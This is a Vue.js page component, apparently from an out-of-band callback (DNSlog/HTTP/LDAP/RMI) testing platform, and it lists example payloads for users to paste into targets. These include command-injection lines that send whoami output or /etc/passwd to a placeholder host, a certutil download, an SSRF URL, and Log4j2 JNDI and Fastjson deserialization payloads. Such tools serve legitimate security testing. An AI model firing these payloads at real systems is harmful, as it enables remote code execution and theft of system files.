<template>
  <div class="app-container">
    <el-row :gutter="20">
      <el-col :span="18" :xs="24">
        <el-card>
          <div class="user-usage">
            <div class="post">
              <h2><a href="/#/dnslog/index">Dnslog</a></h2>
              <p>
                RCE:
                <el-tag class="command-tag" size="small" type="success">nslookup `whoami`.xxx.{{ example_domain }}
                </el-tag>
                &nbsp;
                <el-tag class="command-tag" size="small" type="success">ping `whoami`.xxx.{{ example_domain }}</el-tag>
                <br>
                log4j2:
                <el-tag class="command-tag" size="small" type="success">${jndi:ldap://ldap.xxx.{{ example_domain }}/123}
                </el-tag>
                &nbsp;
                <el-tag class="command-tag" size="small" type="success">${jndi:rmi://rmi.xxx.{{ example_domain }}/123}
                </el-tag>
                <br>
                fastjson:
                <code class="command-tag" size="small" type="success">{
                  "b":{
                  "@type":"com.sun.rowset.JdbcRowSetImpl",
                  "dataSourceName":"rmi://fastjson.xxx.{{ example_domain }}/Exploit",
                  "autoCommit":true
                  }
                  }
                </code>
              </p>
            </div>
            <div class="post">
              <h2><a href="/#/httplog/index">Httplog</a></h2>
              <p>
                RCE:
                <el-tag class="command-tag" size="small" type="success">curl `whoami`.{{ example_ip }}</el-tag>
                &nbsp;
                <el-tag class="command-tag" size="small" type="success">curl -d @/etc/passwd {{ example_ip }}
                </el-tag>
                &nbsp;
                <el-tag class="command-tag" size="small" type="success">certutil -urlcache -split -f
                  http://{{ example_ip }}/x x</el-tag>
                <br>
                SSRF:
                <el-tag class="command-tag" size="small" type="success">?url=http://{{ example_ip }}/x</el-tag>
              </p>
            </div>
            <div class="post">
              <h2><a href="/#/ldaplog/index">Ldaplog</a></h2>
              <p>
                log4j2:
                <el-tag class="command-tag" size="small" type="success">${jndi:ldap://{{ example_ip }}:1389/Exploit}
                </el-tag>
                <br>
                fastjson:
                <el-tag class="command-tag" size="small" type="success">
                  {"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://{{ example_ip }}:1389/Exploit",
                  "autoCommit":true}</el-tag>
              </p>
            </div>
            <div class="post">
              <h2><a href="/#/rmilog/index">Rmilog</a></h2>
              <p>
                log4j2:
                <el-tag class="command-tag" size="small" type="success">${jndi:rmi://{{ example_ip }}:1099/Exploit}
                </el-tag>
                <br>
                fastjson:
                <el-tag class="command-tag" size="small" type="success">{
                  "b":{
                  "@type":"com.sun.rowset.JdbcRowSetImpl",
                  "dataSourceName":"rmi://{{ example_ip }}:1099/Exploit",
                  "autoCommit":true
                  }
                  }</el-tag>
              </p>
            </div>
          </div>
        </el-card>
      </el-col>
    </el-row>
  </div>
</template>

<script>
import { getInfo } from '@/api/user'

export default {
  name: "Usage",
  data() {
    return {
      userinfo: {},
      example_domain: 'example.com',
      example_ip: '1.1.1.1'
    }
  },
  mounted() {
    this.formKeyArr = []
    this.getList()
  },
  methods: {
    getList() {
      getInfo()
        .then((res) => {
          console.log(res)
          this.listLoading = true
          this.userinfo = res.data
          setTimeout(() => {
            this.listLoading = false
          }, 1.5 * 1000)
        })
    },
    Submit() {
      const postdata = {}
      postdata['dingtalk_robot_token'] = this.userinfo.dingtalk_robot_token ? this.userinfo.dingtalk_robot_token : ''
      postdata['bark_url'] = this.userinfo.bark_url ? this.userinfo.bark_url : ''
      postdata['logid'] = this.userinfo.logid ? this.userinfo.logid : ''
      console.log(postdata)
      updateInfo(postdata).then((res) => {
        this.$notify({
          title: '成功',
          message: '更新成功',
          type: 'success'
        });
        this.getList()
      }).catch((err) => {
        this.$notify.error({
          title: '失败',
          message: err,
        });
        this.getList()
      })
    }
  }
}
</script>

<style lang="scss" scoped>
.command-tag {
  font-size: 15px;
}

.user-activity {
  .user-block {

    .username,
    .description {
      display: block;
      margin-left: 50px;
      padding: 2px 0;
    }

    .username {
      font-size: 16px;
      color: #000;
    }

    :after {
      clear: both;
    }

    .img-circle {
      border-radius: 50%;
      width: 40px;
      height: 40px;
      float: left;
    }

    span {
      font-weight: 500;
      font-size: 12px;
    }
  }

  .post {
    font-size: 14px;
    border-bottom: 1px solid #d2d6de;
    margin-bottom: 15px;
    padding-bottom: 15px;
    color: #666;

    .image {
      width: 100%;
      height: 100%;

    }

    .user-images {
      padding-top: 20px;
    }
  }

  .list-inline {
    padding-left: 0;
    margin-left: -5px;
    list-style: none;

    li {
      display: inline-block;
      padding-right: 5px;
      padding-left: 5px;
      font-size: 13px;
    }

    .link-black {

      &:hover,
      &:focus {
        color: #999;
      }
    }
  }

}

.box-center {
  margin: 0 auto;
  display: table;
}

.text-muted {
  color: #777;
}
</style>
